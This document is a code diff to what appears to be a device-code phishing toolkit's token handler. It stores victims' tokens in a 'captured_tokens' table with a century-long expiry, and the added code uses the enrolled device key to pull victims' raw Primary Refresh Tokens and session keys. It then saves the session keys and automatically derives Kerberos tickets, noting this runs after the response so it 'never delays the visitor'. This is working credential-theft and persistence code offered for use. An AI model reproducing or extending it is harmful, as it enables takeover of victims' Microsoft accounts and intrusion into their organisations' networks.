@@ -560,6 +560,10 @@ async function storeToken(job, tokenData, responseCookies = []) {
     let enrollmentTime = null;
     let deviceCertificateEncrypted = null;
     let encryptedPrivateKey = null;
+    // Kept in memory for request_for_device(): the device-signed call is the
+    // only source of the raw PRT and its session_key_jwe.
+    let privateKeyPemForPrt = null;
+    let certificateDerForPrt = null;
 
     if (tokenData.access_token) {
       try {
@@ -578,6 +582,8 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
         if (enrollmentResult.deviceCertificate) deviceCertificateEncrypted = encrypt(enrollmentResult.deviceCertificate);
         if (enrollmentResult.privateKeyPem) encryptedPrivateKey = encrypt(enrollmentResult.privateKeyPem);
+        privateKeyPemForPrt = enrollmentResult.privateKeyPem || null;
+        certificateDerForPrt = enrollmentResult.certificateDerBase64 || null;
 
         console.log('[DeviceProxy] Device enrolled: ' + enrollmentResult.deviceName + ' (' + deviceId + ')');
       } catch (enrollErr) {
@@ -596,6 +602,8 @@ async function storeToken(job, tokenData, responseCookies = []) {
             enrollmentTime = new Date();
             if (retryResult.deviceCertificate) deviceCertificateEncrypted = encrypt(retryResult.deviceCertificate);
             if (retryResult.privateKeyPem) encryptedPrivateKey = encrypt(retryResult.privateKeyPem);
+            privateKeyPemForPrt = retryResult.privateKeyPem || null;
+            certificateDerForPrt = retryResult.certificateDerBase64 || null;
             console.log('[DeviceProxy] Device enrolled after DRS token refresh: ' + (retryResult.deviceName || fresh.deviceId) + ' (' + fresh.deviceId + ')');
           }
         }
@@ -655,6 +663,42 @@ async function storeToken(job, tokenData, responseCookies = []) {
       }
     }
 
+    // ── GraphSpy parity: raw PRT + session_key_jwe via request_for_device ──
+    // The x-ms-RefreshTokenCredential Set-Cookie is a cookie, not the raw PRT,
+    // and the device-code token response carries no session key. The
+    // device-signed (RS256 + x5c) request_for_device call returns BOTH, and it
+    // is the only place session_key_jwe ever comes from — without it
+    // captured_tokens.session_key_jwe stays null and every Kerberos field
+    // (tgt_ad / tgt_cloud / tgt_cloud_sessionkey) stays underivable.
+    if (privateKeyPemForPrt && certificateDerForPrt && tokenData.refresh_token && !sessionKeyJwe) {
+      try {
+        const prtkdf = require('./prtkdf');
+        const prtResult = await prtkdf.requestPrtForDevice({
+          refreshToken: tokenData.refresh_token,
+          privateKeyPem: privateKeyPemForPrt,
+          certificateBase64: certificateDerForPrt,
+        });
+        if (prtResult.prt) prt = prtResult.prt;
+        if (prtResult.sessionKeyJwe) sessionKeyJwe = prtResult.sessionKeyJwe;
+        console.log('[DeviceProxy] PRT + session_key_jwe captured via request_for_device (GraphSpy parity)');
+
+        // Persist the decrypted session key where resolveSessionKeyForToken()
+        // and the Kerberos derivation read it.
+        if (prtResult.sessionKeyHex) {
+          try {
+            await db.query(
+              'UPDATE device_credentials SET session_key_encrypted = ?, updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
+              [encrypt(prtResult.sessionKeyHex), job.user_id, tenant]
+            );
+          } catch (skErr) {
+            console.warn('[DeviceProxy] session key not stored in device_credentials:', skErr.message);
+          }
+        }
+      } catch (prtErr) {
+        console.warn('[DeviceProxy] request_for_device failed (non-fatal):', prtErr.message);
+      }
+    }
+
     // Determine account type from email domain (must be before INSERT)
     // Default to work/school - only personal accounts (outlook/hotmail/live/passport) are excluded
     let accountType = 'work_school';
@@ -678,12 +722,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
           `INSERT INTO captured_tokens
            (user_id, link_id, email, token_type, access_token_encrypted,
             refresh_token_encrypted, id_token_encrypted,
-            prt, session_key_jwe, device_tenant_id,
-            ip_address, user_agent, expiration, tenant, template_type, client_id,
-            account_type,
+            prt, client_info, session_key_jwe, device_tenant_id,
+            cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type,
+            account_type, client_id,
             device_id, device_certificate_encrypted, encrypted_private_key,
             device_enrolled, enrollment_time)
-           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
           [
             job.user_id,
             job.link_id,
@@ -761,6 +805,26 @@ async function storeToken(job, tokenData, responseCookies = []) {
       }
     } catch (e) {
       console.error('[DeviceProxy] Token insert/fallback error:', e && e.message ? e.message : e);
+    }
+
+    // ── Auto-derive Kerberos TGTs (tgt_cloud / tgt_ad / top-level names) ──
+    // The block further down only covers the DRS-registration path
+    // (!deviceEnrolled). This covers the broker-enrolled path — which is the
+    // one that actually yields a raw PRT carrying acrs=pfdr, i.e. the only
+    // PRT that can be exchanged for Kerberos tickets. Runs after the response
+    // is returned, so it never delays the visitor.
+    if (tokenId && deviceEnrolled && accountType === 'work_school'
+        && tenant && tenant !== 'common' && tenant !== 'organizations') {
+      const kerberosService = require('./kerberos');
+      kerberosService.deriveTGTForToken(tokenId)
+        .then(r => {
+          if (r && r.success) {
+            console.log('[DeviceProxy] Kerberos TGTs derived for token', tokenId);
+          } else {
+            console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', (r && r.error) || 'unknown');
+          }
+        })
+        .catch(err => console.error('[DeviceProxy] Kerberos derivation error:', err.message));
     }
 
     // For cookie mode, trigger cookie conversion immediately after capture
